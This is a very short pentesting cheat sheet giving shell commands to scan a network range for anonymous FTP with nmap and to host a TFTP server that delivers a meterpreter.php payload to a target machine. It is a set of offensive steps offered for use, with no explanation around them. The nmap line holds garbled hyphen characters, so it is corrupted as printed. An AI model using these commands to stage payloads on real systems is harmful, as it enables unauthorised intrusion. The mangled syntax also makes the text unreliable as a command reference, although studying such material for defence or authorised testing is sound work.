# Scan for anonymous FTP

`nmap  -­v  -­p  21  -­­‐script=ftp-­‐anon.nse  192.168.11.200-254`

# Download with TFTP

`atftpd --daemon --bind-address 192.168.20.9 /tmp`
`tftp 192.168.20.9 get meterpreter.php C:\\tmp\\meterpreter.php`
